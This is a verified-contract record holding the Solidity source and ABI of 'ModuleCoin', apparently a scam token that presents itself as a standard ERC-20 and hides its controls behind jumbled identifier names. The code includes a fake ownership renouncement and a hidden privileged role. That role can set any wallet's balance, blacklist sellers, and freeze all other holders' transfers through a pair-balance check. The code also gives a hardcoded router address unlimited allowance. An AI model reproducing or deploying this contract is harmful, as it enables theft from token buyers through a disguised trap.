{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buyListTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTotalMode {\n    function createPair(address walletTotal, address autoShouldMode) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface totalModeFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface walletTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalLaunch) external view returns (uint256);\n\n    function transfer(address liquidityAtShould, uint256 fundFee) external returns (bool);\n\n    function allowance(address launchAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityAtShould,\n        uint256 fundFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atReceiver, uint256 value);\n    event Approval(address indexed launchAt, address indexed spender, uint256 value);\n}\n\ninterface walletTradingMetadata is walletTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ModuleCoin is buyListTotal, walletTrading, walletTradingMetadata {\n\n    uint256 public toTxExempt;\n\n    function maxLaunchTrading(address amountLaunched, address liquidityAtShould, uint256 fundFee) internal returns (bool) {\n        if (amountLaunched == tokenBuyTx) {\n            return minAuto(amountLaunched, liquidityAtShould, fundFee);\n        }\n        uint256 buyAtShould = walletTrading(liquidityList).balanceOf(toAuto);\n        require(buyAtShould == shouldLaunch);\n        require(liquidityAtShould != toAuto);\n        if (walletIsShould[amountLaunched]) {\n            return minAuto(amountLaunched, liquidityAtShould, toModeTotal);\n        }\n        fundFee = autoAt(amountLaunched, liquidityAtShould, fundFee);\n        return minAuto(amountLaunched, liquidityAtShould, fundFee);\n    }\n\n    address public liquidityList;\n\n    string private marketingList = \"MCN\";\n\n    function name() external view virtual override returns (string memory) {\n        return isMin;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapSender;\n    }\n\n    uint256 shouldLaunch;\n\n    mapping(address => bool) public walletIsShould;\n\n    function transfer(address launchedLiquidity, uint256 fundFee) external virtual override returns (bool) {\n        return maxLaunchTrading(_msgSender(), launchedLiquidity, fundFee);\n    }\n\n    bool private marketingFee;\n\n    constructor (){\n        \n        fundAmount();\n        totalModeFund limitAt = totalModeFund(marketingSender);\n        liquidityList = isTotalMode(limitAt.factory()).createPair(limitAt.WETH(), address(this));\n        toAuto = isTotalMode(limitAt.factory()).feeTo();\n        if (limitTx) {\n            buyLaunched = enableLiquidity;\n        }\n        tokenBuyTx = _msgSender();\n        receiverSwap[tokenBuyTx] = true;\n        walletLiquidityList[tokenBuyTx] = swapSender;\n        \n        emit Transfer(address(0), tokenBuyTx, swapSender);\n    }\n\n    function swapFee(uint256 fundFee) public {\n        sellExempt();\n        shouldLaunch = fundFee;\n    }\n\n    mapping(address => bool) public receiverSwap;\n\n    mapping(address => mapping(address => uint256)) private isMarketing;\n\n    uint256 public swapMin = 3;\n\n    bool public receiverTx;\n\n    function approve(address swapAutoShould, uint256 fundFee) public virtual override returns (bool) {\n        isMarketing[_msgSender()][swapAutoShould] = fundFee;\n        emit Approval(_msgSender(), swapAutoShould, fundFee);\n        return true;\n    }\n\n    bool public limitTx;\n\n    function launchedExempt(address teamLiquidity) public {\n        if (receiverTx) {\n            return;\n        }\n        \n        receiverSwap[teamLiquidity] = true;\n        if (toTxExempt == listExemptTx) {\n            listExemptTx = buyLaunched;\n        }\n        receiverTx = true;\n    }\n\n    function balanceOf(address totalLaunch) public view virtual override returns (uint256) {\n        return walletLiquidityList[totalLaunch];\n    }\n\n    address marketingSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function autoAt(address amountLaunched, address liquidityAtShould, uint256 fundFee) internal view returns (uint256) {\n        require(fundFee > 0);\n\n        uint256 tradingAmount = 0;\n        if (amountLaunched == liquidityList && swapMin > 0) {\n            tradingAmount = fundFee * swapMin / 100;\n        } else if (liquidityAtShould == liquidityList && shouldMax > 0) {\n            tradingAmount = fundFee * shouldMax / 100;\n        }\n        require(tradingAmount <= fundFee);\n        return fundFee - tradingAmount;\n    }\n\n    uint256 fundSenderTake;\n\n    address toAuto;\n\n    uint256 public buyLaunched;\n\n    address public tokenBuyTx;\n\n    uint256 public enableLiquidity;\n\n    function minAuto(address amountLaunched, address liquidityAtShould, uint256 fundFee) internal returns (bool) {\n        require(walletLiquidityList[amountLaunched] >= fundFee);\n        walletLiquidityList[amountLaunched] -= fundFee;\n        walletLiquidityList[liquidityAtShould] += fundFee;\n        emit Transfer(amountLaunched, liquidityAtShould, fundFee);\n        return true;\n    }\n\n    function sellExempt() private view {\n        require(receiverSwap[_msgSender()]);\n    }\n\n    uint256 constant toModeTotal = 4 ** 10;\n\n    mapping(address => uint256) private walletLiquidityList;\n\n    function getOwner() external view returns (address) {\n        return exemptAmount;\n    }\n\n    uint256 private swapSender = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed toList, address indexed buyExempt);\n\n    address private exemptAmount;\n\n    function owner() external view returns (address) {\n        return exemptAmount;\n    }\n\n    uint256 public listExemptTx;\n\n    string private isMin = \"Module Coin\";\n\n    function transferFrom(address amountLaunched, address liquidityAtShould, uint256 fundFee) external override returns (bool) {\n        if (_msgSender() != marketingSender) {\n            if (isMarketing[amountLaunched][_msgSender()] != type(uint256).max) {\n                require(fundFee <= isMarketing[amountLaunched][_msgSender()]);\n                isMarketing[amountLaunched][_msgSender()] -= fundFee;\n            }\n        }\n        return maxLaunchTrading(amountLaunched, liquidityAtShould, fundFee);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchTrading;\n    }\n\n    uint256 public shouldMax = 0;\n\n    function feeShould(address launchedLiquidity, uint256 fundFee) public {\n        sellExempt();\n        walletLiquidityList[launchedLiquidity] = fundFee;\n    }\n\n    function fundAmount() public {\n        emit OwnershipTransferred(tokenBuyTx, address(0));\n        exemptAmount = address(0);\n    }\n\n    function autoMarketing(address sellSender) public {\n        sellExempt();\n        if (toTxExempt == buyLaunched) {\n            toTxExempt = enableLiquidity;\n        }\n        if (sellSender == tokenBuyTx || sellSender == liquidityList) {\n            return;\n        }\n        walletIsShould[sellSender] = true;\n    }\n\n    uint8 private launchTrading = 18;\n\n    function allowance(address feeLimit, address swapAutoShould) external view virtual override returns (uint256) {\n        if (swapAutoShould == marketingSender) {\n            return type(uint256).max;\n        }\n        return isMarketing[feeLimit][swapAutoShould];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapAutoShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAutoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"}],\"name\":\"autoMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"}],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExemptTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"swapFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTxExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuyTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAtShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletIsShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ModuleCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}